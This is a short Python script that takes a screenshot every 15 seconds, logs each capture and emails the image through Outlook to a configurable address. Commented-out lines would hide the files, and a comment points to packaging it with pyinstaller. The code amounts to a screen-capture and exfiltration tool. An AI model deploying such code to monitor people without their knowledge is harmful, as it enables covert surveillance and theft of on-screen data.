import pyscreenshot as ImageGrab 
#function:  ImageGrab.grab(), .save(FILELOCATION)
import win32com.client
import schedule
import os
import time

from datetime import datetime
from multiprocessing import Process, freeze_support


def auto_screenshot():
    #if there is no folder
    newpath = r'./screenshots' 
    if not os.path.exists(newpath):
      os.makedirs(newpath)
      sc_log = open("./screenshots/Log.txt", "w")
    else:
       sc_log = open("./screenshots/Log.txt", "a")
    
    #Begin screenshot
    sc_log.write("Begin to take screenshot------------"+f"{str(datetime.now())}\n")


    #screenshot_name = f"autoScreenshot_{str(datetime.now())}".replace(":","-")
    #screenshot_name = "autoScreenshot"

    screenshot = ImageGrab.grab()
    screenshot_path = f"./screenshots/autoScreenshot.png"
    screenshot.save(screenshot_path)

    sc_log.write("Screenshot finished----------------------------------------\n")
    sc_log.close()
    

    
    ol = win32com.client.gencache.EnsureDispatch("Outlook.Application").GetNamespace("MAPI")
    ol = win32com.client.Dispatch("Outlook.Application")

    olmailitem=0x0 #size of the new email
    newmail=ol.CreateItem(olmailitem)
    newmail.Subject= f'Screenshot{str(datetime.now())}'
    # input the target email address
    # ex: newmail.To='bangabngabng@hanyang.ac.kr'
    newmail.To=''
    
    newmail.Body= 'Hello, this is a test email to send autoScreenshot.'
    #attach = "C:\\Users\\Stefano Bang\\Desktop\\Workplace\\python\\screenshots\\autoScreenshot.png"
    raw_attach = os.getcwd()+"/screenshots/autoScreenshot.png"                              
    print(raw_attach)
    attach =  f'{raw_attach}'
    newmail.Attachments.Add(attach)
    newmail.Send()

    # #hide files
    # os.system("attrib +h ./screenshots/Log.txt")
    # os.system("attrib +h ./screenshots/autoScreenshot.png")
    return screenshot_path


def main():
    #Will take screenshot every X minutes
    #schedule.every(5).minutes.do(auto_screenshot)
    schedule.every(15).seconds.do(auto_screenshot) #for testing
    
    while True:
      schedule.run_pending()
      time.sleep(1)

if __name__ == '__main__':
  freeze_support()
  print("Begin")
  p = Process(target=main)
  p.start()
  
  


    #pyinstaller autoscreenshot.py


